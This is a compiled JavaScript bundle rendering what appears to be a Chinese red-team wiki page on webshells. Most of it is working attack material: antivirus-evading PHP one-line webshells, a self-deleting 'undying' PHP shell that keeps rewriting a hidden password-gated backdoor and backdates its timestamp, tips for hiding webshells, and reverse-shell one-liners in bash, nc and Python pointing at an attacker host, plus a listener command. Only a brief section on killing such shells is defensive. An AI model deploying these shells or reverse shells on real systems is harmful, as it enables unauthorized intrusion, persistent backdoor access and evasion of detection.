(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[34],{176:function(e,a,n){"use strict";n.r(a),function(e){n.d(a,"default",(function(){return i}));var t,s=n(95),p=(n(139),n(0),n(96));function c(){return(c=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var n=arguments[a];for(var t in n)Object.prototype.hasOwnProperty.call(n,t)&&(e[t]=n[t])}return e}).apply(this,arguments)}function b(e,a){if(null==e)return{};var n,t,s=function(e,a){if(null==e)return{};var n,t,s={},p=Object.keys(e);for(t=0;t<p.length;t++)n=p[t],a.indexOf(n)>=0||(s[n]=e[n]);return s}(e,a);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(t=0;t<p.length;t++)n=p[t],a.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}(t="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&t(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var o,m,r=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(p.b)("div",a)}},l={},N="wrapper";function i(e){var a=e.components,n=b(e,["components"]);return Object(p.b)(N,c({},l,n,{components:a,mdxType:"MDXLayout"}),Object(p.b)("h1",{className:"__internal",id:"php"},"PHP",Object(p.b)("a",c({parentName:"h1"},{href:"#php","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"文件免杀（Apache、Nginx特性）"),"cmd"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"implode"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"reset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"get_defined_vars"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//返回由所有已定义变量所组成的数组    "),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"Use")," age：cmd",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),"php",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"?"),"a",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),"whoami",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n适用于",Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"PHP")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"<")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"7.1")," ，因为在",Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"PHP7"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),"之后assert被弃用了、",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"7.2")," create_function被弃用了")))),Object(p.b)("p",null,"一句话"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?")," @",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token boolean constant"}),"false")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"?")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),":")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_POST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"))))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"流量免杀")),Object(p.b)("p",null,"蚁剑自定义编码器 ",Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php",target:"_blank"}),"https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php")," "),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"内存马")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"//nodie_shell.php\n",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"set_time_limit"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//设置脚本最大执行时间,0 即为无时间限制"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"ignore_user_abort"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token boolean constant"}),"true"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//设置与客户机断开不终止脚本的执行"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"unlink"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"__FILE__"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//删除文件自身"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'/var/www/html/.shell.php'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),'\'<?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8"){@system($_POST[a]);}?>\''),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"while")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"file_put_contents"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$file"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$code"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//写shell文件"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'touch -m -d \"2014-10-31 13:50:11\" .shell.php'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//修改时间戳"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"usleep"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1000"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//以指定的微秒数延缓程序的执行"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"杀死PHP不死马")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"1"),"、高权限，重启服务\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"service")," apache2 restart\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"service")," php restart\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"2"),"、低权限，杀掉所有进程\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"kill")," -9 -1\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"killall")," apache2"))),Object(p.b)("h1",{className:"__internal",id:"jsp"},"JSP",Object(p.b)("a",c({parentName:"h1"},{href:"#jsp","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"Tomcat无文件Shell： ",Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/z1Ro0/tomcat_nofile_webshell",target:"_blank"}),"https://github.com/z1Ro0/tomcat_nofile_webshell")," "),Object(p.b)("p",null,"冰蝎去特征（请参考酒仙桥六号部队的文章）"),Object(p.b)("p",null,Object(p.b)("a",c({parentName:"p"},{href:"https://mp.weixin.qq.com/s/s_DcLdhEtIZkC2_z0Zz4FQ",target:"_blank"}),"冰蝎，从入门到魔改")),Object(p.b)("p",null,Object(p.b)("a",c({parentName:"p"},{href:"https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484318&idx=1&sn=ece9e52218be0ea84ef166c3bfd20f23&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188&scene=126&sessionid=1596615082&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f&ascene=1&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=AzFdHdxTih44P2kITVRk35s%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb",target:"_blank"}),"冰蝎改造之不改动客户端=>内存马")),Object(p.b)("h2",{className:"__internal",id:"隐藏webshell"},"隐藏WebShell",Object(p.b)("a",c({parentName:"h2"},{href:"#%E9%9A%90%E8%97%8Fwebshell","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"1、仿照已存在的文件起名字，隐藏在深层目录， 创建…目录隐藏shell（ls -al你就知道为啥了）"),Object(p.b)("p",{parentName:"blockquote"},"2、利用静态文件，比如图片马然后利用 .htaccess 进行解析"),Object(p.b)("p",{parentName:"blockquote"},"3、修改WebShell时间戳为同目录下其它文件相同的时间")),Object(p.b)("h1",{className:"__internal",id:"反弹shell"},"反弹Shell",Object(p.b)("a",c({parentName:"h1"},{href:"#%E5%8F%8D%E5%BC%B9shell","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"#Bash"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"bash")," -i ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">&")," /dev/tcp/attackerip/6666 ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),Object(p.b)("span",c({parentName:"span"},{className:"token file-descriptor important"}),"0"),">"),Object(p.b)("span",c({parentName:"code"},{className:"token file-descriptor important"}),"&1"),"\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"#nc"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"nc")," -e /bin/sh attackerip ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"6666"),"\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"#python"),"\npython -c ",Object(p.b)("span",c({parentName:"code"},{className:"token string"}),"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"(("),'"',Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"10.1"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),".1"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),".15"),'"',Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"6666"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"))")),';os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''),"\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"#DNS_Shell"),"\nhttps://github.com/ahhh/Reverse_DNS_Shell\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"#icmp_shell"),"\nhttp://icmpshell.sourceforge.net/\n\n",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"#Linux(index.js)"),"\nhttps://github.com/lukechilds/reverse-shell"))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"PHP"),"： ",Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/pentestmonkey/php-reverse-shell",target:"_blank"}),"https://github.com/pentestmonkey/php-reverse-shell")," "),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"JSP"),"： ",Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/z3v2cicidi/jsp-reverse-shell",target:"_blank"}),"https://github.com/z3v2cicidi/jsp-reverse-shell")," "),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"ASPX"),"： ",Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/borjmz/aspx-reverse-shell",target:"_blank"}),"https://github.com/borjmz/aspx-reverse-shell")," "),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},Object(p.b)("strong",{parentName:"p"},"攻击机 VPS 监听接 shell"))),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"nc")," -lvp ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"666")))))}i.isMDXComponent=!0,i=Object(s.hot)(e)(i),(o="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(o.register(r,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\webshell.md"),o.register(l,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\webshell.md"),o.register(N,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\webshell.md"),o.register(i,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\webshell.md")),(m="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&m(e)}.call(this,n(23)(e))}}]);